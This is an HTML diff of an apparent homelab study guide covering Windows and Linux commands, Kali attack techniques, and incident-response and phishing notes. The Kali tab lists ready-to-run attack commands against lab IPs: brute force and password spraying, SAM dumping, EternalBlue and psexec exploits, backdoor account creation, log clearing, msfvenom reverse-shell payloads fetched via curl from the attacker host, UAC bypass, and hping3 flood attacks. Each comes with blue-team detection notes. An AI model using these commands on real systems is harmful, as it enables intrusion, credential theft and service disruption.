+          <div class="spl-desc">List all Windows event logs that contain events. Use when you cannot find which log contains an event. Shows every log with its event count so you know where to look.</div>
+          <div class="spl-block">gpupdate /force</div>
+          <div class="spl-desc">Force Group Policy update on CLIENT01 after making changes on FETT DC. Run in Command Prompt or PowerShell as Admin. Wait for completion message before testing GPO effects.</div>
+          <div class="spl-block">auditpol /get /subcategory:"Security Group Management"</div>
+          <div class="spl-desc">Verify audit policy is enabled for group management events. Must show Success for Event ID 4728 and 4732 to be generated. If shows No Auditing — enable with: auditpol /set /subcategory:"Security Group Management" /success:enable</div>
+        </div>
+      </div>
+    </div>
+    <div id="study-linux" class="study-panel" style="display:none;">
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">📁 File & Navigation</div>
+          <div class="spl-block">ls -la</div>
+          <div class="spl-desc">List all files including hidden files with permissions, owner, size, and date.</div>
+          <div class="spl-block">cd /var/log && ls -la</div>
+          <div class="spl-desc">Navigate to log directory and list all log files. Key location for security investigation.</div>
+          <div class="spl-block">find / -name "filename" 2>/dev/null</div>
+          <div class="spl-desc">Search entire system for a specific file. Suppress permission errors with 2>/dev/null.</div>
+          <div class="spl-block">cat /etc/passwd</div>
+          <div class="spl-desc">View all system user accounts. Common target in post-exploitation enumeration.</div>
+          <div class="spl-block">grep -r "searchterm" /var/log/</div>
+          <div class="spl-desc">Search recursively through log files for a specific string or pattern.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">⚙️ Process & System</div>
+          <div class="spl-block">ps aux | grep processname</div>
+          <div class="spl-desc">List all running processes and filter for a specific process name.</div>
+          <div class="spl-block">top</div>
+          <div class="spl-desc">Real time process monitor showing CPU and memory usage. Press q to quit.</div>
+          <div class="spl-block">kill -9 PID</div>
+          <div class="spl-desc">Force kill a process by its PID. Use ps aux to find the PID first.</div>
+          <div class="spl-block">systemctl status servicename</div>
+          <div class="spl-desc">Check status of a system service. Shows if running, stopped, or failed.</div>
+          <div class="spl-block">systemctl start/stop/restart servicename</div>
+          <div class="spl-desc">Start, stop, or restart a system service.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🌐 Network Commands</div>
+          <div class="spl-block">ifconfig -a</div>
+          <div class="spl-desc">Show all network interfaces and their IP addresses. Use ip addr on newer systems.</div>
+          <div class="spl-block">netstat -tulpn</div>
+          <div class="spl-desc">Show all listening ports with process names. Identify what services are running and on which ports.</div>
+          <div class="spl-block">ping -c 4 8.8.8.8</div>
+          <div class="spl-desc">Send 4 ping packets to test connectivity. -c limits the count.</div>
+          <div class="spl-block">nslookup domain.com</div>
+          <div class="spl-desc">DNS lookup for a domain. Verify DNS resolution is working correctly.</div>
+          <div class="spl-block">curl -I https://google.com</div>
+          <div class="spl-desc">Send HTTP request and show response headers only. Test web connectivity.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📋 Log Analysis</div>
+          <div class="spl-block">tail -f /var/log/syslog</div>
+          <div class="spl-desc">Follow a log file in real time. Shows new entries as they are written. Ctrl+C to stop.</div>
+          <div class="spl-block">tail -n 100 /var/log/auth.log</div>
+          <div class="spl-desc">Show last 100 lines of authentication log. Contains login attempts and sudo usage.</div>
+          <div class="spl-block">grep "Failed password" /var/log/auth.log</div>
+          <div class="spl-desc">Find all failed SSH login attempts in auth log.</div>
+          <div class="spl-block">grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</div>
+          <div class="spl-desc">Count failed login attempts by IP address — Linux equivalent of Splunk brute force query.</div>
+          <div class="spl-block">cat /var/log/auth.log | grep "Accepted"</div>
+          <div class="spl-desc">Show all successful SSH logins from auth log.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔐 Permissions & Users</div>
+          <div class="spl-block">whoami && id</div>
+          <div class="spl-desc">Show current user and group memberships including sudo access.</div>
+          <div class="spl-block">sudo -l</div>
+          <div class="spl-desc">List what commands current user can run with sudo. Key for privilege escalation assessment.</div>
+          <div class="spl-block">cat /etc/sudoers</div>
+          <div class="spl-desc">View sudo permissions configuration. Requires root access.</div>
+          <div class="spl-block">chmod 755 filename</div>
+          <div class="spl-desc">Set file permissions. 7=rwx owner, 5=rx group, 5=rx others.</div>
+          <div class="spl-block">chown user:group filename</div>
+          <div class="spl-desc">Change file owner and group. Used to fix permission issues.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🛠️ Splunk on Linux</div>
+          <div class="spl-block">sudo /opt/splunk/bin/splunk start</div>
+          <div class="spl-desc">Start Splunk Enterprise on Linux server.</div>
+          <div class="spl-block">sudo /opt/splunk/bin/splunk status</div>
+          <div class="spl-desc">Check if Splunk is running and show process status.</div>
+          <div class="spl-block">sudo /opt/splunk/bin/splunk restart</div>
+          <div class="spl-desc">Restart Splunk — use after configuration changes.</div>
+          <div class="spl-block">tail -f /opt/splunk/var/log/splunk/splunkd.log</div>
+          <div class="spl-desc">Monitor Splunk daemon log in real time for errors or issues.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🌐 Network Capture & Analysis</div>
+          <div class="spl-block">tcpdump -i eth0 -w capture.pcap</div>
+          <div class="spl-desc">Capture all network traffic on eth0 and save to pcap file. Open in Wireshark for analysis. Use on Ubuntu SIEM to capture traffic between lab VMs. Stop with Ctrl+C.</div>
+          <div class="spl-block">tcpdump -i eth0 host 192.168.15.62</div>
+          <div class="spl-desc">Capture only traffic to or from CLIENT01. Useful for isolating specific host traffic during investigation. Filters out all other lab traffic.</div>
+          <div class="spl-block">tcpdump -i eth0 port 445</div>
+          <div class="spl-desc">Capture only SMB traffic on port 445. Use during brute force simulation to see attack traffic in real time.</div>
+          <div class="spl-block">netdiscover -r 192.168.15.0/24</div>
+          <div class="spl-desc">ARP-based host discovery. Finds all live hosts on lab network showing IP and MAC addresses. Faster than nmap for simple host discovery.</div>
+          <div class="spl-block">ss -tulpn</div>
+          <div class="spl-desc">Modern replacement for netstat. Shows all listening ports with process names on Ubuntu SIEM. Verify Splunk port 8000 and forwarder port 9997 are listening.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Linux Troubleshooting</div>
+          <div class="spl-block">sudo /opt/splunk/bin/splunk status</div>
+          <div class="spl-desc">Check if Splunk is running on Ubuntu SIEM. If not running — start with: sudo /opt/splunk/bin/splunk start. Run this first when Splunk web UI is not accessible at 192.168.15.128:8000.</div>
+          <div class="spl-block">sudo systemctl status splunk</div>
+          <div class="spl-desc">Alternative way to check Splunk service status using systemctl. Shows detailed status including recent log entries and whether service failed to start.</div>
+          <div class="spl-block">sudo ufw status</div>
+          <div class="spl-desc">Check Ubuntu firewall status. If active verify ports 8000 and 9997 are allowed. If Splunk is running but unreachable the firewall may be blocking connections.</div>
+          <div class="spl-block">sudo ufw allow 8000/tcp && sudo ufw allow 9997/tcp</div>
+          <div class="spl-desc">Open Splunk web UI port 8000 and forwarder receiver port 9997 in Ubuntu firewall. Run if Splunk is running but CLIENT01 or FETT cannot connect to it.</div>
+          <div class="spl-block">ping 192.168.15.62</div>
+          <div class="spl-desc">Test connectivity from Ubuntu SIEM to CLIENT01. If ping fails check VMware network adapter settings — all VMs should be on same VMnet for lab communication.</div>
+          <div class="spl-block">tail -f /opt/splunk/var/log/splunk/splunkd.log | grep ERROR</div>
+          <div class="spl-desc">Monitor Splunk errors in real time. Run when forwarders are not connecting or searches return no results. Shows connection attempts and authentication errors from forwarders.</div>
+          <div class="spl-block">df -h</div>
+          <div class="spl-desc">Check disk space on Ubuntu SIEM. Splunk stops indexing when disk is full. If disk over 80% full — clear old Splunk indexes or expand VM disk space.</div>
+          <div class="spl-block">free -h</div>
+          <div class="spl-desc">Check RAM usage on Ubuntu SIEM. If memory is full Splunk performance degrades significantly. Restart Splunk if memory usage is critically high.</div>
+        </div>
+      </div>
+    </div>
+    <div id="study-kali" class="study-panel" style="display:none;">
+      <div style="background:rgba(255,50,50,0.05);border:1px solid rgba(255,50,50,0.2);border-radius:8px;padding:16px;margin-bottom:20px;">
+        <div style="color:#ff4444;font-family:'Share Tech Mono',monospace;font-size:12px;font-weight:700;margin-bottom:8px;">⚠️ EDUCATIONAL PURPOSE ONLY</div>
+        <div style="color:#8899aa;font-size:12px;line-height:1.7;">
+          All commands below are for use in your <strong style="color:#e2e8f0;">isolated VMware lab environment only</strong>. Understanding attack techniques makes you a better defender — knowing how attacks work helps you recognize them in logs, understand what Event IDs fire, and explain incidents to customers. Never use these against systems you do not own.
+        </div>
+      </div>
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">🔍 Reconnaissance — Information Gathering</div>
+          <div class="spl-block">nmap -sV -sC 192.168.15.62</div>
+          <div class="spl-desc">Service version scan with default scripts against CLIENT01. Identifies open ports, services, and versions. Example output: 445/tcp open microsoft-ds, 3389/tcp open ms-wbt-server. Blue team detection: generates firewall connection logs and IDS alerts.</div>
+          <div class="spl-block">nmap -p- 192.168.15.44</div>
+          <div class="spl-desc">Full port scan of FETT DC — all 65535 ports. Slower but finds non-standard ports. Blue team: large volume of SYN packets from single IP in short timeframe is a clear scan indicator.</div>
+          <div class="spl-block">nmap -sn 192.168.15.0/24</div>
+          <div class="spl-desc">Ping sweep — discovers all live hosts without port scanning. Example: finds CLIENT01 at .62, FETT at .44, SIEM at .128. Blue team: ICMP flood from single source in short window.</div>
+          <div class="spl-block">nmap -O 192.168.15.62</div>
+          <div class="spl-desc">OS fingerprinting — identifies Windows 11 on CLIENT01. Attackers use this to select appropriate exploits. Blue team: unusual TCP/IP pattern analysis in network logs.</div>
+          <div class="spl-block">nmap -sV --script vuln 192.168.15.62</div>
+          <div class="spl-desc">Vulnerability scan against CLIENT01. Runs NSE scripts checking for known CVEs on detected services. Blue team: generates many connection attempts across multiple ports rapidly.</div>
+          <div class="spl-block">enum4linux -a 192.168.15.44</div>
+          <div class="spl-desc">Enumerate Windows/Samba information from FETT DC. Pulls usernames, shares, password policy, group memberships. Blue team: generates multiple Event ID 4625 anonymous auth attempts on DC.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">💥 Brute Force & Credential Attacks</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p /usr/share/wordlists/rockyou.txt</div>
+          <div class="spl-desc">SMB brute force against CLIENT01 — this is exactly what generated 262 Event ID 4625 entries in your homelab investigation. Blue team detects: spike in 4625, then 4740 lockout, source IP identified as Kali.</div>
+          <div class="spl-block">netexec smb 192.168.15.0/24 -u administrator -p Password123</div>
+          <div class="spl-desc">Password spray — tests ONE password against ALL hosts. Avoids lockout by not repeating same account. Blue team: 4625 events spread across multiple hosts from same source IP simultaneously.</div>
+          <div class="spl-block">netexec smb 192.168.15.44 -u '' -p '' --shares</div>
+          <div class="spl-desc">Null session enumeration against FETT DC — attempts anonymous access to list shares. Blue team: Event ID 4625 with empty username, Logon Type 3, from Kali IP.</div>
+          <div class="spl-block">netexec winrm 192.168.15.62 -u administrator -p Password123</div>
+          <div class="spl-desc">WinRM brute force — Windows Remote Management on port 5985. If successful gives PowerShell remote session. Blue team: Event ID 4624 Type 3 from Kali IP if successful.</div>
+          <div class="spl-block">hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.15.128</div>
+          <div class="spl-desc">SSH brute force against Ubuntu SIEM with username list AND password list. Blue team: /var/log/auth.log shows rapid "Failed password" entries from Kali IP.</div>
+          <div class="spl-block">netexec smb 192.168.15.44 -u administrator -p Password123 --sam</div>
+          <div class="spl-desc">Dump SAM database from FETT DC after gaining valid credentials. Extracts local account NTLM hashes. Blue team: Event ID 4688 showing reg.exe accessing SAM hive, Event ID 4672 privilege use.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔓 Exploitation — Gaining Access</div>
+          <div class="spl-block">msfconsole</div>
+          <div class="spl-desc">Launch Metasploit Framework. Type 'search [vulnerability]' to find exploits. Use 'use [module]', 'set RHOSTS [target]', 'set LHOST [kali IP]', then 'run'.</div>
+          <div class="spl-block">use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.15.62
+set LHOST 192.168.15.X
+run</div>
+          <div class="spl-desc">EternalBlue against CLIENT01 — WannaCry vulnerability on SMB port 445. Only works on unpatched systems. Blue team: Event ID 4625 failed auth attempts then unusual SYSTEM level process spawning from smb service.</div>
+          <div class="spl-block">use exploit/windows/smb/psexec
+set RHOSTS 192.168.15.62
+set SMBUser administrator
+set SMBPass Password123
+run</div>
+          <div class="spl-desc">PSExec attack — uses valid credentials to get SYSTEM shell on CLIENT01. Blue team: Event ID 4624 Type 3 from Kali, then 7045 new service installed named PSEXESVC, then 4688 cmd.exe as SYSTEM.</div>
+          <div class="spl-block">use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.15.0/24
+run</div>
+          <div class="spl-desc">Scan entire lab network for EternalBlue vulnerability. Shows which hosts are vulnerable before exploiting. Blue team: mass connection attempts to port 445 across all subnet hosts.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🏃 Post-Exploitation — After Access</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p Password123 --shares</div>
+          <div class="spl-desc">Enumerate SMB shares after gaining creds. Lists all accessible shares on CLIENT01. Blue team: Event ID 4624 Type 3 from Kali, then 5140 network share object accessed.</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p Password123 -x "whoami /all"</div>
+          <div class="spl-desc">Execute command on CLIENT01 using valid creds. Shows current user privileges. Blue team: Event ID 4688 showing cmd.exe with whoami command, parent process from SMB service.</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p Password123 -x "net user backdoor Password123! /add"</div>
+          <div class="spl-desc">Create backdoor admin account on CLIENT01. Blue team: Event ID 4720 new account created, then 4732 added to administrators group, both at unusual time from SYSTEM.</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p Password123 -x "net localgroup administrators backdoor /add"</div>
+          <div class="spl-desc">Add backdoor account to local admins. Blue team: Event ID 4732 user added to Administrators group — critical alert for privilege escalation detection.</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p Password123 --get-file C:\Windows\System32\drivers\etc\hosts /tmp/hosts</div>
+          <div class="spl-desc">Exfiltrate hosts file from CLIENT01 to Kali. Blue team: Event ID 5145 detailed file share access, large outbound transfer to Kali IP.</div>
+          <div class="spl-block">netexec smb 192.168.15.44 -u administrator -p Password123 -x "wevtutil cl Security"</div>
+          <div class="spl-desc">Clear Security event log on FETT DC — attacker covering tracks. Blue team: Event ID 1102 audit log cleared — always alert on this immediately.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📡 Reverse Shells & Payloads</div>
+          <div class="spl-block">nc -lvnp 4444</div>
+          <div class="spl-desc">Netcat listener on Kali port 4444. Waits for victim to connect back. Blue team on Windows: outbound connection from victim to Kali:4444 visible in Event ID 4688 (process with network activity) and firewall logs.</div>
+          <div class="spl-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.15.X LPORT=4444 -f exe -o shell.exe</div>
+          <div class="spl-desc">Generate Windows reverse shell .exe payload connecting back to Kali. Blue team: file hash detectable in VirusTotal, execution generates 4688, outbound connection on port 4444 is suspicious.</div>
+          <div class="spl-block">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.15.X LPORT=4444 -f exe -o meter.exe</div>
+          <div class="spl-desc">Meterpreter reverse shell — more capable than basic shell. Allows file upload/download, screenshot, keylogging, privilege escalation. Blue team: same detection as above plus unusual memory injection behavior.</div>
+          <div class="spl-block">python3 -m http.server 80</div>
+          <div class="spl-desc">Host malicious files on Kali. Victim downloads with: curl http://192.168.15.X/shell.exe -o C:\Temp\shell.exe. Blue team: certutil or curl downloading from internal IP is suspicious, file in Temp directory.</div>
+          <div class="spl-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.15.X LPORT=4444 -f powershell -o shell.ps1</div>
+          <div class="spl-desc">PowerShell reverse shell payload — fileless option. Blue team: Event ID 4688 showing powershell.exe with encoded command, outbound connection on unusual port.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Privilege Escalation</div>
+          <div class="spl-block">use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run</div>
+          <div class="spl-desc">After getting Meterpreter session — automatically find local privilege escalation vulnerabilities on the target. Shows which exploits may work to get SYSTEM from user level.</div>
+          <div class="spl-block">use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+set LHOST 192.168.15.X
+run</div>
+          <div class="spl-desc">UAC bypass using Event Viewer — elevates from admin to SYSTEM without triggering UAC prompt. Blue team: eventvwr.exe spawning unexpected child processes is suspicious.</div>
+          <div class="spl-block">netexec smb 192.168.15.62 -u administrator -p Password123 -x "whoami /priv"</div>
+          <div class="spl-desc">Check current privileges on CLIENT01. Lists all privilege tokens assigned to current user. Attackers look for SeImpersonatePrivilege or SeDebugPrivilege for further escalation.</div>
+          <div class="spl-block">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+run</div>
+          <div class="spl-desc">Local kernel exploit for privilege escalation — requires existing session. Blue team: unusual SYSTEM level processes spawning from unexpected parent, Event ID 4688 chain analysis.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🌊 Network Stress Testing — hping3</div>
+          <div style="background:rgba(255,165,0,0.08);border:1px solid rgba(255,165,0,0.2);border-radius:6px;padding:10px;margin-bottom:12px;">
+            <div style="color:#ffaa00;font-family:'Share Tech Mono',monospace;font-size:11px;">⚠️ LAB USE ONLY — These commands generate high network traffic. Only run against your own VMs on isolated VMware network. Never run against production systems.</div>
+          </div>
+          <div class="spl-block">sudo hping3 -S --flood -V -p 80 192.168.15.62</div>
+          <div class="spl-desc">SYN flood against CLIENT01 port 80. Sends thousands of SYN packets per second without completing TCP handshake. Blue team: massive spike in firewall connection logs, CPU spike on victim, legitimate traffic drops. Classic DoS simulation.</div>
+          <div class="spl-block">sudo hping3 -S --flood -V -p 445 192.168.15.62</div>
+          <div class="spl-desc">SYN flood targeting SMB port 445 on CLIENT01. Overwhelms the SMB service specifically. Blue team: SMB service becomes unresponsive, Event ID 7034 service crash may appear, connection timeout errors in logs.</div>
+          <div class="spl-block">sudo hping3 -S --flood -V -p 8000 192.168.15.128</div>
+          <div class="spl-desc">SYN flood against Splunk web UI on Ubuntu SIEM port 8000. Tests resilience of your SIEM dashboard. Blue team: Splunk becomes unresponsive, /var/log/syslog shows connection refused errors rapidly accumulating.</div>
+          <div class="spl-block">sudo hping3 --udp --flood -p 53 192.168.15.44</div>
+          <div class="spl-desc">UDP flood against DNS port 53 on FETT DC. Overwhelms DNS service — if DC DNS goes down all domain authentication fails. Blue team: DNS query failures across all domain joined machines, Event ID 4625 spikes as auth fails.</div>
+          <div class="spl-block">sudo hping3 -1 --flood 192.168.15.62</div>
+          <div class="spl-desc">ICMP flood against CLIENT01. Ping flood saturates network bandwidth. Blue team: network latency spikes for all VMs on subnet, ICMP traffic dominates capture in Wireshark or tcpdump.</div>
+          <div class="spl-block">sudo hping3 -S -p 3389 --flood 192.168.15.62</div>
+          <div class="spl-desc">SYN flood targeting RDP port 3389 on CLIENT01. Makes remote desktop inaccessible. Blue team: RDP connections timeout, firewall logs show massive SYN traffic from Kali IP to port 3389.</div>
+          <div class="spl-block">sudo hping3 -S -p 80 -c 100 --interval u1000 192.168.15.62</div>
+          <div class="spl-desc">Controlled rate test — sends 100 SYN packets with 1ms interval. Less aggressive than --flood. Use this first to understand traffic volume before running full flood tests.</div>
+          <div class="spl-block">sudo apt install hping3 -y</div>
+          <div class="spl-desc">Install hping3 if not present on Kali. May need to install after fresh Kali VM rebuild.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Kali Setup & Tools</div>
+          <div class="spl-block">sudo apt update && sudo apt upgrade -y</div>
+          <div class="spl-desc">Update all Kali packages. Run after fresh install or reinstall. Keeps all attack tools current with latest versions.</div>
+          <div class="spl-block">sudo apt install netexec seclists -y</div>
+          <div class="spl-desc">Install netexec (SMB/WinRM attacks) and SecLists (comprehensive wordlist collection). SecLists includes rockyou.txt and many other useful wordlists.</div>
+          <div class="spl-block">ifconfig eth0</div>
+          <div class="spl-desc">Check Kali IP address. Always know your LHOST value before generating payloads or setting up listeners. Your Kali IP on VMware network starts with 192.168.15.X.</div>
+          <div class="spl-block">gunzip /usr/share/wordlists/rockyou.txt.gz</div>
+          <div class="spl-desc">Extract rockyou wordlist. Required before first use with brute force tools. Contains 14 million common passwords used in real attacks.</div>
+          <div class="spl-block">searchsploit windows smb</div>
+          <div class="spl-desc">Search local Exploit-DB database for SMB vulnerabilities. Offline reference for known CVEs. Shows exploit script paths you can use directly.</div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Kali Troubleshooting</div>
+          <div class="spl-block">ifconfig eth0 || ip addr show eth0</div>
+          <div class="spl-desc">Verify Kali has an IP address before running any attacks. If no IP assigned — check VMware network adapter is set to same VMnet as other lab VMs. Run: sudo dhclient eth0 to request IP from DHCP.</div>
+          <div class="spl-block">ping 192.168.15.62 && ping 192.168.15.44</div>
+          <div class="spl-desc">Test connectivity to CLIENT01 and FETT before attacking. If ping fails check VMware network settings. All lab VMs must be on same virtual network for attacks to reach targets.</div>
+          <div class="spl-block">sudo apt update && sudo apt install netexec -y</div>
+          <div class="spl-desc">Install or reinstall netexec after fresh Kali rebuild. Run this first after reinstalling Kali VM — netexec may not be present by default on all Kali versions.</div>
+          <div class="spl-block">ls /usr/share/wordlists/</div>
+          <div class="spl-desc">Check if wordlists are present. If rockyou.txt not listed run: gunzip /usr/share/wordlists/rockyou.txt.gz to extract it. Required for brute force attacks.</div>
+          <div class="spl-block">sudo service postgresql start && msfconsole</div>
+          <div class="spl-desc">Start PostgreSQL database before Metasploit. Metasploit requires PostgreSQL to store session and workspace data. If msfconsole shows database errors run this first.</div>
+          <div class="spl-block">netexec smb 192.168.15.62 --gen-relay-list targets.txt</div>
+          <div class="spl-desc">Test if netexec can reach targets before running attacks. If connection refused check target is running and SMB port 445 is open. Use nmap first to verify port is open.</div>
+          <div class="spl-block">sudo hping3 --version</div>
+          <div class="spl-desc">Verify hping3 is installed. If not found run: sudo apt install hping3 -y. Required for DoS testing exercises against lab VMs.</div>
+          <div class="spl-block">jobs && fg</div>
+          <div class="spl-desc">Check background jobs and bring to foreground. Use when netcat listener or other tool is running in background. Ctrl+Z sends process to background, fg brings it back.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- IR & PHISHING TAB -->
+    <div id="study-ir" class="study-panel" style="display:none;">
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">🚨 PICERL — SANS IR Framework</div>
+          <div class="study-item"><span class="port-num">P</span><span class="port-desc">PREPARATION — Have tools, playbooks, and contacts ready BEFORE an incident. Your homelab IS preparation. Having Splunk alerts configured is preparation.</span></div>
+          <div class="study-item"><span class="port-num">I</span><span class="port-desc">IDENTIFICATION — Detect and confirm something is actually happening. Your Splunk brute force alert firing is identification. Investigating the phishing email is identification.</span></div>
+          <div class="study-item"><span class="port-num">C</span><span class="port-desc">CONTAINMENT — Stop the bleeding. Isolate affected systems. Disable compromised accounts. Block attacker IP. In your lab: disabling SMB and NetBIOS was containment.</span></div>
+          <div class="study-item"><span class="port-num">E</span><span class="port-desc">ERADICATION — Remove the threat completely. Delete malware, close vulnerabilities, remove backdoors. Check Autoruns for persistence mechanisms.</span></div>
+          <div class="study-item"><span class="port-num">R</span><span class="port-desc">RECOVERY — Restore systems to normal operation. Verify clean before reconnecting. Monitor closely for reinfection. Restore from clean backups if needed.</span></div>
+          <div class="study-item"><span class="port-num">L</span><span class="port-desc">LESSONS LEARNED — Document what happened, what worked, what failed. Update playbooks. Your three incident reports ARE lessons learned documentation.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📧 Email Header Analysis</div>
+          <div class="study-item"><span class="port-num">From</span><span class="port-desc">Display name — can be anything. NEVER trust just the display name. Always check the actual email address behind it. Example: "PayPal Security" &lt;attacker@gmail.com&gt;</span></div>
+          <div class="study-item"><span class="port-num">Mailed-By</span><span class="port-desc">Actual sending server domain. If mailed-by differs from From domain — red flag. In Santander investigation mailed-by matched santander.us — confirmed legitimate.</span></div>
+          <div class="study-item"><span class="port-num">Signed-By</span><span class="port-desc">DKIM signature domain. Cryptographic proof email came from that domain's servers. Cannot be easily faked. Santander email was signed-by santander.us — strong legitimacy indicator.</span></div>
+          <div class="study-item"><span class="port-num">SPF</span><span class="port-desc">Sender Policy Framework — confirms sending IP is authorized by domain. PASS = IP is on domain's approved sender list. FAIL = possible spoofing. Check in Authentication-Results header.</span></div>
+          <div class="study-item"><span class="port-num">DKIM</span><span class="port-desc">DomainKeys Identified Mail — cryptographic email signature. PASS = email was not modified in transit and came from authorized server. Your Santander investigation showed dkim=pass.</span></div>
+          <div class="study-item"><span class="port-num">DMARC</span><span class="port-desc">Domain-based Message Authentication — policy that tells receiving servers what to do with failed SPF/DKIM. p=REJECT means spoofed emails get blocked. Santander had p=REJECT — strongest policy.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🎣 Phishing Attack Types</div>
+          <div class="study-item"><span class="port-num">TOAD</span><span class="port-desc">Telephone Oriented Attack Delivery — phishing email with a fake phone number. Victim calls the number instead of clicking a link. Your real investigation found Unicode characters inserted into the phone number digits to bypass filters.</span></div>
+          <div class="study-item"><span class="port-num">Spear</span><span class="port-desc">Targeted phishing at a specific person. Uses personal info to appear legitimate. More convincing than mass phishing. Higher success rate because it is personalized.</span></div>
+          <div class="study-item"><span class="port-num">Whaling</span><span class="port-desc">Spear phishing targeting executives — CEOs, CFOs. High value targets. Often involves fake wire transfer requests or urgent business emails.</span></div>
+          <div class="study-item"><span class="port-num">Vishing</span><span class="port-desc">Voice phishing — phone calls impersonating banks, tech support, IRS. The Santander Executive Office calls could have been vishing if not verified. Always call back on official numbers.</span></div>
+          <div class="study-item"><span class="port-num">Smishing</span><span class="port-desc">SMS phishing — fake text messages with malicious links. Common fake delivery notifications, bank alerts, prize notifications.</span></div>
+          <div class="study-item"><span class="port-num">BEC</span><span class="port-desc">Business Email Compromise — attacker compromises or spoofs executive email to request wire transfers or credential changes. Costs businesses billions annually.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔴 Phishing Red Flags</div>
+          <div class="study-item"><span class="port-num">Unicode</span><span class="port-desc">Hidden unicode characters inserted into text to bypass filters. Your Geek Squad investigation found combining diacritic characters in the phone number. CyberChef can reveal these hidden characters.</span></div>
+          <div class="study-item"><span class="port-num">onmicrosoft</span><span class="port-desc">Throwaway Microsoft 365 tenant. Free M365 trials create @[name].onmicrosoft.com domains. Your phishing investigation traced sender infrastructure to a throwaway M365 tenant.</span></div>
+          <div class="study-item"><span class="port-num">Urgency</span><span class="port-desc">Pressure to act immediately — account suspended, payment due, limited time offer. Designed to prevent you from thinking carefully. Real banks say they will never pressure you.</span></div>
+          <div class="study-item"><span class="port-num">Reply-To</span><span class="port-desc">Different from From address. Email appears from legitimate company but replies go to attacker. Always check if Reply-To differs from From domain.</span></div>
+          <div class="study-item"><span class="port-num">Lookalike</span><span class="port-desc">Domains designed to look like real ones. Examples: paypa1.com, amaz0n.com, rn instead of m (rn looks like m in some fonts). Always check full domain carefully.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🗺️ MITRE ATT&CK Tactics</div>
+          <div class="study-item"><span class="port-num">TA0001</span><span class="port-desc">Initial Access — how attacker gets in. Phishing, exploiting public-facing apps, supply chain compromise, valid accounts.</span></div>
+          <div class="study-item"><span class="port-num">TA0002</span><span class="port-desc">Execution — running malicious code. PowerShell scripts, scheduled tasks, Windows services, command line interpreters.</span></div>
+          <div class="study-item"><span class="port-num">TA0003</span><span class="port-desc">Persistence — staying after reboot. Registry Run keys, new services (Event ID 7045), scheduled tasks, startup folder items. Check with Autoruns.</span></div>
+          <div class="study-item"><span class="port-num">TA0004</span><span class="port-desc">Privilege Escalation — gaining higher access. Adding accounts to admin groups (Event ID 4732), exploiting vulnerabilities, token manipulation.</span></div>
+          <div class="study-item"><span class="port-num">TA0005</span><span class="port-desc">Defense Evasion — avoiding detection. Disabling logging (Event ID 4719), clearing event logs, using legitimate tools (living off the land).</span></div>
+          <div class="study-item"><span class="port-num">TA0006</span><span class="port-desc">Credential Access — stealing passwords. Brute force (Event ID 4625/4740), Mimikatz credential dumping, keylogging.</span></div>
+          <div class="study-item"><span class="port-num">TA0007</span><span class="port-desc">Discovery — learning the environment. Port scanning with nmap, reading /etc/passwd, Active Directory enumeration with BloodHound.</span></div>
+          <div class="study-item"><span class="port-num">TA0008</span><span class="port-desc">Lateral Movement — moving to other systems. Pass-the-hash, RDP (Event ID 4624 Type 10), SMB file shares, using netexec.</span></div>
+          <div class="study-item"><span class="port-num">TA0010</span><span class="port-desc">Exfiltration — stealing data. Data over C2 channel, FTP transfer, DNS tunneling, HTTP POST to external server.</span></div>
+          <div class="study-item"><span class="port-num">TA0040</span><span class="port-desc">Impact — final objective. Ransomware encryption, data destruction, defacement, disruption of services.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📝 IOC Types & Where To Submit</div>
+          <div class="study-item"><span class="port-num">IP</span><span class="port-desc">Malicious IP addresses. Submit to: VirusTotal, AbuseIPDB, Cisco Talos. Example: 142.251.189.83 from your phishing investigation was Google infrastructure being abused.</span></div>
+          <div class="study-item"><span class="port-num">Domain</span><span class="port-desc">Malicious domains. Submit to: VirusTotal, URLScan.io, PhishTank. Check registration date — very new domains are suspicious.</span></div>
